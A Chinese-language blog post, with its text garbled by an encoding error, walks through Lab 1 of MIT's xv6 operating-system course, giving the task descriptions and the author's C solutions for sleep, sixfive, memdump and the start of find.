pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Lab1</h2>
<h3 data-id="heading-1">Boot xv6 (easy)</h3>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2025
<span class="hljs-built_in">cd</span> xv6-labs-2025
make qemu <span class="hljs-comment"># Build and run xv6</span>
</code></pre>
<p>è¿è¡Œåè¿›å…¥qemuï¼Œè¦é€€å‡º qemuï¼Œè¯·é”®å…¥ï¼šCtrl-a xï¼ˆåŒæ—¶æŒ‰ä¸‹Ctrlå’Œaåæ¾å¼€ï¼Œç„¶åæŒ‰ä¸‹xï¼‰</p>
<h3 data-id="heading-2">sleep (easy)</h3>
<p>æœ¬ç»ƒä¹ æ—¨åœ¨è®©æ‚¨ç†Ÿæ‚‰å¦‚ä½•åœ¨ xv6 ä¸Šç¼–å†™ç”¨æˆ·ç¨‹åºä»¥åŠ<code>pause</code>ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<blockquote>
<p>ä¸º xv6å®ç°ä¸€ä¸ªç”¨æˆ·çº§<code>ç¡çœ </code>ç¨‹åºï¼Œç±»ä¼¼äº UNIX çš„ sleep å‘½ä»¤ã€‚ä½ çš„<code>ç¡çœ ç¨‹åºåº”è¯¥æš‚åœç”¨æˆ·æŒ‡å®šçš„æ—¶é’Ÿå‘¨æœŸæ•°ã€‚æ—¶é’Ÿå‘¨æœŸæ˜¯ xv6 å†…æ ¸å®šä¹‰çš„ä¸€ä¸ªæ—¶é—´å•ä½ï¼Œå³å®šæ—¶å™¨èŠ¯ç‰‡ä¸¤æ¬¡ä¸­æ–­ä¹‹é—´çš„æ—¶é—´é—´éš”ã€‚ä½ çš„ä»£ç åº”è¯¥å†™åœ¨``user/sleep.c</code>æ–‡ä»¶ä¸­ ã€‚</p>
</blockquote>
<p>æç¤ºï¼š</p>
<ul>
<li>
<p>åœ¨å¼€å§‹ç¼–å†™ä»£ç ä¹‹å‰ï¼Œè¯·é˜…è¯»<a href="https://link.juejin.cn?target=https%3A%2F%2Fpdos.csail.mit.edu%2F6.S081%2F2025%2Fxv6%2Fbook-riscv-rev5.pdf" target="_blank" title="https://pdos.csail.mit.edu/6.S081/2025/xv6/book-riscv-rev5.pdf" ref="nofollow noopener noreferrer">xv6 ä¹¦</a>çš„ç¬¬ä¸€ç« ã€‚</p>
</li>
<li>
<p>æŠŠä½ çš„ä»£ç æ”¾åœ¨<code>user/sleep.cä¸­ã€‚çœ‹çœ‹``user/</code>ç›®å½•ä¸‹çš„å…¶ä»–ä¸€äº›ç¨‹åº ï¼ˆä¾‹å¦‚<code>user/echo.c</code>ã€<code>user/grep.c</code>å’Œ<code>user/rm.c</code>ï¼‰ï¼Œäº†è§£å‘½ä»¤è¡Œå‚æ•°æ˜¯å¦‚ä½•ä¼ é€’ç»™ç¨‹åºçš„ã€‚</p>
</li>
<li>
<p><code>å°†æ‚¨çš„ç¡çœ </code>ç¨‹åºæ·»åŠ åˆ° Makefile ä¸­çš„<code>UPROGS</code>ï¼›å®Œæˆæ­¤æ“ä½œåï¼Œ<code>make qemu</code>å°†ç¼–è¯‘æ‚¨çš„ç¨‹åºï¼Œæ‚¨å°±å¯ä»¥ä» xv6 shell è¿è¡Œå®ƒã€‚</p>
</li>
<li>
<p>å¦‚æœç”¨æˆ·å¿˜è®°ä¼ é€’å‚æ•°ï¼Œsleep åº”è¯¥æ‰“å°é”™è¯¯æ¶ˆæ¯ã€‚</p>
</li>
<li>
<p>å‘½ä»¤è¡Œå‚æ•°ä»¥å­—ç¬¦ä¸²å½¢å¼ä¼ é€’ï¼›æ‚¨å¯ä»¥ä½¿ç”¨<code>atoi</code>å°†å…¶è½¬æ¢ä¸ºæ•´æ•°ï¼ˆè¯·å‚é˜… user/ulib.cï¼‰ã€‚</p>
</li>
<li>
<p>ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨<code>pause()</code>ã€‚</p>
</li>
<li>
<p><code>æœ‰å…³å®ç°pause()</code>ç³»ç»Ÿè°ƒç”¨çš„ xv6 å†…æ ¸ä»£ç ï¼Œè¯·å‚é˜…<code>kernel/sysproc.c</code>ï¼ˆæŸ¥æ‰¾<code>sys_pause</code>ï¼‰ï¼›æœ‰å…³ç”¨æˆ·ç¨‹åºå¯è°ƒç”¨çš„<code>pause()</code> çš„ C å®šä¹‰ï¼Œè¯·å‚é˜…<code>user/user.hï¼›æœ‰å…³ä»ç”¨æˆ·ä»£ç è·³è½¬åˆ°å†…æ ¸ä»¥``è°ƒç”¨ pause() çš„</code>æ±‡ç¼–ä»£ç ï¼Œè¯·å‚é˜…<code>user/usys.S</code>ã€‚````````````</p>
</li>
<li>
<p>è¯·å‚é˜… Kernighan å’Œ Ritchie åˆè‘—çš„*ã€ŠC ç¨‹åºè®¾è®¡è¯­è¨€ã€‹ï¼ˆç¬¬äºŒç‰ˆï¼‰*ï¼ˆK&amp;Rï¼‰ä¸€ä¹¦ï¼Œäº†è§£ C è¯­è¨€ã€‚</p>
</li>
</ul>
<h4 data-id="heading-3">My Solution:</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/types.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/stat.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"user/user.h"</span></span>

<span class="hljs-type">int</span> 
<span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>
{
  <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>) {
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"usage: sleep &lt;time&gt;\n"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
  }
  pause(atoi(argv[<span class="hljs-number">1</span>]));
  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre>
<h3 data-id="heading-4">sixfive (moderate)</h3>
<p>åœ¨æœ¬ç»ƒä¹ ä¸­ï¼Œæ‚¨å°†ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ open å’Œ readã€C å­—ç¬¦ä¸²ä»¥åŠåœ¨ C ä¸­å¤„ç†æ–‡æœ¬æ–‡ä»¶ã€‚</p>
<blockquote>
<p>å¯¹äºæ¯ä¸ªè¾“å…¥æ–‡ä»¶ï¼Œsixfiveå¿…é¡»æ‰“å°æ–‡ä»¶ä¸­æ‰€æœ‰ 5 æˆ– 6 çš„å€æ•°ã€‚æ•°å­—æ˜¯ç”±å­—ç¬¦ä¸²â€œ-\r\t\n./,"â€ä¸­å­—ç¬¦åˆ†éš”çš„åè¿›åˆ¶æ•°å­—åºåˆ—ã€‚å› æ­¤ï¼Œå¯¹äºâ€œxv6â€ä¸­çš„â€œ6â€ï¼Œsixfive ä¸åº”è¯¥æ‰“å° 6ï¼Œè€Œåº”è¯¥æ‰“å°ä¾‹å¦‚â€œ/6,"â€ã€‚</p>
</blockquote>
<p>ä»¥ä¸‹ç¤ºä¾‹è¯´æ˜äº† sixfive çš„è¡Œä¸ºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ sixfive sixfive.txt
5
100
18
6
$
</code></pre>
<p>æç¤ºï¼š</p>
<ul>
<li>ä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦åˆ°è¾“å…¥æ–‡ä»¶ã€‚</li>
<li>æ‚¨å¯ä»¥ä½¿ç”¨strchræµ‹è¯•å­—ç¬¦æ˜¯å¦ä¸ä»»ä½•åˆ†éš”ç¬¦åŒ¹é…ï¼ˆè¯·å‚é˜… user/ulib.cï¼‰ã€‚</li>
<li>æ–‡ä»¶å¼€å¤´å’Œç»“å°¾æ˜¯éšå¼åˆ†éš”ç¬¦ã€‚</li>
</ul>
<h4 data-id="heading-5">My Solution:</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/types.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"user/user.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fcntl.h"</span></span>

<span class="hljs-comment">// å®šä¹‰çŠ¶æ€</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ST_READY   0  <span class="hljs-comment">// å‡†å¤‡å¥½æ¥æ”¶æ–°æ•°å­—</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ST_DIGITS  1  <span class="hljs-comment">// æ­£åœ¨è¯»æ•°å­—</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ST_INVALID 2  <span class="hljs-comment">// éæ³•å­—ç¬¦çŠ¶æ€</span></span>

<span class="hljs-type">void</span> <span class="hljs-title function_">sixfive</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span> {
    <span class="hljs-type">char</span> c;
    <span class="hljs-type">int</span> state = ST_READY;
    <span class="hljs-type">long</span> <span class="hljs-type">long</span> current_val = <span class="hljs-number">0</span>;
    <span class="hljs-type">char</span> *seps = <span class="hljs-string">" -\r\t\n./,"</span>;

    <span class="hljs-comment">// é€å­—ç¬¦è¯»å–ï¼Œè¿™æ˜¯é¢˜ç›®ç»™å‡ºçš„ Hint</span>
    <span class="hljs-keyword">while</span> (read(fd, &amp;c, <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(seps, c)) {
            <span class="hljs-comment">// é‡åˆ°åˆ†éš”ç¬¦ï¼Œå¦‚æœä¹‹å‰æ­£åœ¨è¯»æœ‰æ•ˆæ•°å­—ï¼Œåˆ™åˆ¤æ–­å¹¶æ‰“å°</span>
            <span class="hljs-keyword">if</span> (state == ST_DIGITS) {
                <span class="hljs-keyword">if</span> (current_val % <span class="hljs-number">5</span> == <span class="hljs-number">0</span> || current_val % <span class="hljs-number">6</span> == <span class="hljs-number">0</span>) {
                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%lld\n"</span>, current_val);
                }
            }
            <span class="hljs-comment">// é‡åˆ°åˆ†éš”ç¬¦åï¼Œé‡ç½®çŠ¶æ€ä¸º READY</span>
            state = ST_READY;
            current_val = <span class="hljs-number">0</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">'0'</span> &amp;&amp; c &lt;= <span class="hljs-string">'9'</span>) {
            <span class="hljs-comment">// é‡åˆ°æ•°å­—</span>
            <span class="hljs-keyword">if</span> (state == ST_READY || state == ST_DIGITS) {
                state = ST_DIGITS;
                current_val = current_val * <span class="hljs-number">10</span> + (c - <span class="hljs-string">'0'</span>);
            }
            <span class="hljs-comment">// å¦‚æœæœ¬æ¥å°±æ˜¯ INVALID çŠ¶æ€ï¼Œåˆ™ä¿æŒ INVALID</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// é‡åˆ°æ—¢éåˆ†éš”ç¬¦ä¹Ÿéæ•°å­—çš„å­—ç¬¦ï¼ˆå¦‚ 'v'ï¼‰</span>
            state = ST_INVALID;
            current_val = <span class="hljs-number">0</span>;
        }
    }

    <span class="hljs-comment">// éšå¼åˆ†éš”ç¬¦ï¼šå¤„ç†æ–‡ä»¶æœ«å°¾çš„æƒ…å†µ</span>
    <span class="hljs-keyword">if</span> (state == ST_DIGITS) {
        <span class="hljs-keyword">if</span> (current_val % <span class="hljs-number">5</span> == <span class="hljs-number">0</span> || current_val % <span class="hljs-number">6</span> == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%lld\n"</span>, current_val);
        }
    }
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> {
    <span class="hljs-type">int</span> fd, i;

    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"usage: sixfive files...\n"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; argc; i++) {
        <span class="hljs-keyword">if</span> ((fd = open(argv[i], O_RDONLY)) &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"sixfive: cannot open %s\n"</span>, argv[i]);
            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
        }
        sixfive(fd);
        close(fd);
    }
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre>
<h3 data-id="heading-6">memdump (easy)</h3>
<p>è¿™ä¸ªç»ƒä¹ å°†å¸®åŠ©ä½ æ›´å¤šç»ƒä¹ ä½¿ç”¨ C æŒ‡é’ˆã€‚å¼€å§‹ä¹‹å‰ï¼Œè¯·é˜…è¯»ã€ŠC ç¨‹åºè®¾è®¡è¯­è¨€ï¼ˆç¬¬äºŒç‰ˆï¼‰ã€‹ä¸­ Kernighan å’Œ Ritchieï¼ˆK&amp;Rï¼‰æ‰€è‘—çš„ 5.1 èŠ‚ï¼ˆæŒ‡é’ˆå’Œåœ°å€ï¼‰åˆ° 5.6 èŠ‚ï¼ˆæŒ‡é’ˆæ•°ç»„ï¼‰ä»¥åŠ 6.4 èŠ‚ï¼ˆæŒ‡å‘ç»“æ„çš„æŒ‡é’ˆï¼‰ã€‚</p>
<p>çœ‹çœ‹ <code>user/memdump.c</code> ã€‚ä½ çš„ä»»åŠ¡æ˜¯å®ç°è¿™ä¸ªå‡½æ•° <code>memdump(char *fmt, char *data)</code> ã€‚ <code>memdump()</code> çš„ç›®çš„æ˜¯æŒ‰ç…§ fmt å‚æ•°æè¿°çš„æ ¼å¼æ‰“å° data æŒ‡å‘çš„å†…å­˜å†…å®¹ã€‚æ ¼å¼æ˜¯ä¸€ä¸ª C å­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦æŒ‡ç¤ºå¦‚ä½•æ‰“å° data çš„è¿ç»­éƒ¨åˆ†ã€‚å› æ­¤ï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªå…·æœ‰å¤šä¸ªå­—æ®µçš„ C ç»“æ„ä½“å¯ä»¥é€šè¿‡åŒ…å«å¤šä¸ªå­—ç¬¦çš„æ ¼å¼å­—ç¬¦ä¸²æ¥æ‰“å°ã€‚</p>
<p>ä½ çš„ memdump()åº”è¯¥å¤„ç†ä»¥ä¸‹æ ¼å¼å­—ç¬¦ï¼š</p>
<ul>
<li>i: å°†æ¥ä¸‹æ¥çš„ 4 ä¸ªå­—èŠ‚çš„æ•°æ®ä»¥åè¿›åˆ¶å½¢å¼æ‰“å°ä¸º 32 ä½æ•´æ•°ã€‚</li>
<li>p: å°†æ¥ä¸‹æ¥çš„ 8 ä¸ªå­—èŠ‚çš„æ•°æ®ä»¥åå…­è¿›åˆ¶å½¢å¼æ‰“å°ä¸º 64 ä½æ•´æ•°ã€‚</li>
<li>h: å°†æ¥ä¸‹æ¥çš„ 2 ä¸ªå­—èŠ‚çš„æ•°æ®ä»¥åè¿›åˆ¶å½¢å¼æ‰“å°ä¸º 16 ä½æ•´æ•°ã€‚</li>
<li>c: å°†æ¥ä¸‹æ¥çš„ 1 ä¸ªå­—èŠ‚çš„æ•°æ®ä»¥ 8 ä½ ASCII å­—ç¬¦å½¢å¼æ‰“å°ã€‚</li>
<li>s: æ¥ä¸‹æ¥çš„ 8 ä¸ªå­—èŠ‚åŒ…å«ä¸€ä¸ªæŒ‡å‘ C å­—ç¬¦ä¸²çš„ 64 ä½æŒ‡é’ˆï¼›æ‰“å°è¯¥å­—ç¬¦ä¸²ã€‚</li>
<li>S: å‰©ä½™çš„æ•°æ®åŒ…å«ä¸€ä¸ªç©ºç»ˆæ­¢çš„ C å­—ç¬¦ä¸²çš„å­—èŠ‚ï¼›æ‰“å°è¯¥å­—ç¬¦ä¸²ã€‚</li>
</ul>
<p>ä½ å¯ä»¥è‡ªç”±ä½¿ç”¨ C çš„ <code>printf()</code> ä¸­çš„ <code>memdump()</code> ã€‚</p>
<p>å¦‚æœ <code>memdump</code> ç¨‹åºæ²¡æœ‰å‚æ•°è¢«æ‰§è¡Œï¼Œå®ƒä¼šè°ƒç”¨ <code>memdump()</code> ä¼ é€’ä¸€äº›ç¤ºä¾‹æ ¼å¼å­—ç¬¦ä¸²å’Œæ•°æ®ã€‚å¦‚æœ <code>memdump()</code> æ­£ç¡®å®ç°ï¼Œè¾“å‡ºå°†ä¼šæ˜¯ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">$</span> <span class="hljs-string">memdump</span>
<span class="hljs-attr">Example 1:</span>
<span class="hljs-number">61810</span>
<span class="hljs-number">2025</span>
<span class="hljs-attr">Example 2:</span>
<span class="hljs-string">a</span> <span class="hljs-string">string</span>
<span class="hljs-attr">Example 3:</span>
<span class="hljs-string">another</span>
<span class="hljs-attr">Example 4:</span>
<span class="hljs-string">BD0</span>
<span class="hljs-number">1819438967</span>
<span class="hljs-number">100</span>
<span class="hljs-string">z</span>
<span class="hljs-string">xyzzy</span>
<span class="hljs-attr">Example 5:</span>
<span class="hljs-string">hello</span>
<span class="hljs-string">w</span>
<span class="hljs-string">o</span>
<span class="hljs-string">r</span>
<span class="hljs-string">l</span>
<span class="hljs-string">d</span>
</code></pre>
<p>ä½ å¯èƒ½ä¼šå¾—åˆ° Example 4 è¾“å‡ºç¬¬ä¸€è¡Œçš„ä¸åŒåå…­è¿›åˆ¶åœ°å€ã€‚</p>
<p>å¦‚æœ <code>memdump</code> ç¨‹åºå¸¦å‚æ•°è¢«è°ƒç”¨ï¼Œå®ƒä¼šè¯»å–å…¶æ ‡å‡†è¾“å…¥ç›´åˆ°æ–‡ä»¶ç»“æŸï¼Œç„¶åè°ƒç”¨ <code>memdump()</code> ï¼Œå¹¶ä¼ é€’æ ¼å¼å’Œè¾“å…¥æ•°æ®ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦ <code>memdump()</code> è¢«å®ç°ï¼š</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$ </span><span class="bash"><span class="hljs-built_in">echo</span> deadc0de | memdump hhcccc</span>
25956
25697
c
0
d
e
<span class="hljs-meta prompt_">$ </span><span class="bash"><span class="hljs-built_in">echo</span> deadc0de | memdump p</span>
64616564
<span class="hljs-meta prompt_">$ </span><span class="bash">
</span></code></pre>
<p>å®ç° <code>memdump()</code> ã€‚</p>
<h4 data-id="heading-7">My Solution:</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">memdump</span><span class="hljs-params">(<span class="hljs-type">char</span>* fmt, <span class="hljs-type">char</span>* data)</span> {
    <span class="hljs-comment">// Your code here.</span>
    <span class="hljs-type">char</span>* p = fmt;
    <span class="hljs-type">char</span>* curr = data;  <span class="hljs-comment">// ä½¿ç”¨ä¸€ä¸ªä¸´æ—¶æŒ‡é’ˆæ¥éå†æ•°æ®</span>

    <span class="hljs-keyword">while</span> (*p) {
        <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'i'</span>) {
            <span class="hljs-comment">// æ‰“å° 4 å­—èŠ‚æ•´æ•°</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, *(<span class="hljs-type">int</span>*)curr);
            curr += <span class="hljs-number">4</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'p'</span>) {
            <span class="hljs-comment">// æ‰“å° 8 å­—èŠ‚åå…­è¿›åˆ¶æ•´æ•°</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%lx\n"</span>, *(uint64*)curr);
            curr += <span class="hljs-number">8</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'h'</span>) {
            <span class="hljs-comment">// æ‰“å° 2 å­—èŠ‚çŸ­æ•´æ•°</span>
            <span class="hljs-comment">// æ³¨æ„ï¼šxv6 çš„ printf å¯èƒ½éœ€è¦ %d æ¥æ‰“å° short</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, *(<span class="hljs-type">short</span>*)curr);
            curr += <span class="hljs-number">2</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'c'</span>) {
            <span class="hljs-comment">// æ‰“å° 1 å­—èŠ‚å­—ç¬¦</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c\n"</span>, *curr);
            curr += <span class="hljs-number">1</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'s'</span>) {
            <span class="hljs-comment">// æ•°æ®é‡Œå­˜çš„æ˜¯ä¸€ä¸ªæŒ‡å‘å­—ç¬¦ä¸²çš„ 8 å­—èŠ‚æŒ‡é’ˆ</span>
            <span class="hljs-type">char</span>* str_ptr = *(<span class="hljs-type">char</span>**)curr;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, str_ptr);
            curr += <span class="hljs-number">8</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'S'</span>) {
            <span class="hljs-comment">// æ•°æ®é‡Œç›´æ¥å°±æ˜¯å­—ç¬¦ä¸²çš„å†…å®¹</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, curr);
            <span class="hljs-comment">// 'S' æ ‡å¿—é€šå¸¸æ„å‘³ç€å¤„ç†å‰©ä½™çš„æ‰€æœ‰æ•°æ®ï¼Œæˆ–è€…ç›´åˆ°é‡åˆ° \0</span>
            <span class="hljs-comment">// æ ¹æ®é¢˜ç›®æè¿° "the rest of the data"ï¼Œæ‰“å°åå¯ä»¥ç»“æŸ</span>
            <span class="hljs-keyword">return</span>;
        }
        p++;
    }
}
</code></pre>
<h3 data-id="heading-8">find (moderate)</h3>
<p>è¿™ä¸ªç»ƒä¹ æ¢è®¨äº†è·¯å¾„åå’Œç›®å½•ï¼Œä»¥åŠç³»ç»Ÿè°ƒç”¨ openã€read å’Œ fstatã€‚</p>
<p>ä¸º xv6 ç¼–å†™ä¸€ä¸ªç®€å•çš„ UNIX find ç¨‹åºï¼šæŸ¥æ‰¾ç›®å½•æ ‘ä¸­æ‰€æœ‰å…·æœ‰ç‰¹å®šåç§°çš„æ–‡ä»¶ã€‚ä½ çš„è§£å†³æ–¹æ¡ˆåº”ä¿å­˜åœ¨æ–‡ä»¶ <code>user/find.c</code> ä¸­ã€‚</p>
<p>ä¸€äº›æç¤ºï¼š</p>
<ul>
<li>æŸ¥çœ‹ user/ls.cï¼Œäº†è§£å¦‚ä½•è¯»å–ç›®å½•ã€‚</li>
<li>ä½¿ç”¨é€’å½’ä½¿ find èƒ½å¤Ÿæ·±å…¥å­ç›®å½•ã€‚</li>
<li>ä¸è¦é€’å½’è¿›å…¥"."å’Œ".."ã€‚</li>
<li>æ¯æ¬¡ä½ è°ƒç”¨ make qemu ï¼Œå®ƒéƒ½ä¼šæ„å»ºä¸€ä¸ªæ–°çš„ fs.imgï¼Œåˆ é™¤å…ˆå‰è¿è¡Œä¸­åˆ›å»ºçš„æ–‡ä»¶ã€‚å¦‚æœä½ å¸Œæœ›ä½¿ç”¨å…ˆå‰ä½¿ç”¨çš„æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨ qemuï¼Œè¯·ä½¿ç”¨ make qemu-fs ã€‚</li>
<li>ä½ éœ€è¦ä½¿ç”¨ C å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚æŸ¥çœ‹ K&amp;Rï¼ˆC è¯­è¨€ä¹¦ç±ï¼‰ä¸­çš„ç¬¬ 5.5 èŠ‚ã€‚</li>
<li>æ³¨æ„ï¼Œ== ä¸åƒ Python é‚£æ ·æ¯”è¾ƒå­—ç¬¦ä¸²ã€‚è¯·ä½¿ç”¨ strcmp()ã€‚</li>
<li>å°†ç¨‹åºæ·»åŠ åˆ° Makefile ä¸­çš„ <code>UPROGS</code> ã€‚</li>
</ul>
<p>ä½ çš„è§£å†³æ–¹æ¡ˆåº”è¯¥äº§ç”Ÿä»¥ä¸‹è¾“å‡ºï¼ˆå½“æ–‡ä»¶ç³»ç»ŸåŒ…å«æ–‡ä»¶ <code>b</code> ã€ <code>a/b</code> å’Œ <code>a/aa/b</code> æ—¶ï¼‰ï¼š</p>
<pre><code class="hljs language-less" lang="less">    $ <span class="hljs-selector-tag">make</span> <span class="hljs-selector-tag">qemu</span>
    ...
    <span class="hljs-selector-tag">init</span>: <span class="hljs-selector-tag">starting</span> <span class="hljs-selector-tag">sh</span>
    $ <span class="hljs-selector-tag">echo</span> &gt; <span class="hljs-selector-tag">b</span>
    $ <span class="hljs-selector-tag">mkdir</span> <span class="hljs-selector-tag">a</span>
    $ <span class="hljs-selector-tag">echo</span> &gt; <span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">b</span>
    $ <span class="hljs-selector-tag">mkdir</span> <span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">aa</span>
    $ <span class="hljs-selector-tag">echo</span> &gt; <span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">aa</span>/<span class="hljs-selector-tag">b</span>
    $ <span class="hljs-selector-tag">find</span> . <span class="hljs-selector-tag">b</span>
    ./<span class="hljs-selector-tag">b</span>
    ./<span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">b</span>
    ./<span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">aa</span>/<span class="hljs-selector-tag">b</span>
    $
  
</code></pre>
<p>è¿è¡Œ <code>make grade</code> æ¥çœ‹çœ‹æˆ‘ä»¬çš„æµ‹è¯•ä¼šæ€ä¹ˆè®¤ä¸ºã€‚</p>
<h4 data-id="heading-9">My Solution:</h4>
<p>éœ€è¦æ³¨æ„<code>#include "kernel/types.h"</code>å¿…é¡»æ”¾åœ¨æœ€å‰é¢ï¼Œå› ä¸ºå…¶ä»–å¤´æ–‡ä»¶ä¸­æ²¡æœ‰å¼•å…¥<code>"kernel/types.h"</code>ï¼Œä½¿ç”¨<code>uint</code>ç­‰ç±»å‹ä¼šæŠ¥é”™</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/types.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fcntl.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fs.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/stat.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"user/user.h"</span></span>

<span class="hljs-comment">// è·å–è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼ˆæŒ‡å‘ path å­—ç¬¦ä¸²ä¸­æœ€åä¸€ä¸ª '/' ä¹‹åçš„å­—ç¬¦ï¼‰</span>
<span class="hljs-comment">// ä¾‹å¦‚: "a/b/c" -&gt; "c", "file" -&gt; "file"</span>
<span class="hljs-type">char</span>* <span class="hljs-title function_">fmtname</span><span class="hljs-params">(<span class="hljs-type">char</span>* path)</span> {
    <span class="hljs-type">char</span>* p;
    <span class="hljs-comment">// ä»å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹å‘å‰æŸ¥æ‰¾ç¬¬ä¸€ä¸ª '/'</span>
    <span class="hljs-keyword">for</span> (p = path + <span class="hljs-built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="hljs-string">'/'</span>; p--);
    p++;  <span class="hljs-comment">// ç§»åŠ¨åˆ° '/' ä¹‹åçš„å­—ç¬¦ï¼Œæˆ–è€…å¦‚æœæ²¡æ‰¾åˆ° '/' åˆ™æŒ‡å‘ path å¼€å¤´</span>
    <span class="hljs-keyword">return</span> p;
}

<span class="hljs-type">void</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">char</span>* path, <span class="hljs-type">char</span>* target)</span> {
    <span class="hljs-type">char</span> buf[<span class="hljs-number">512</span>], *p;
    <span class="hljs-type">int</span> fd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span>

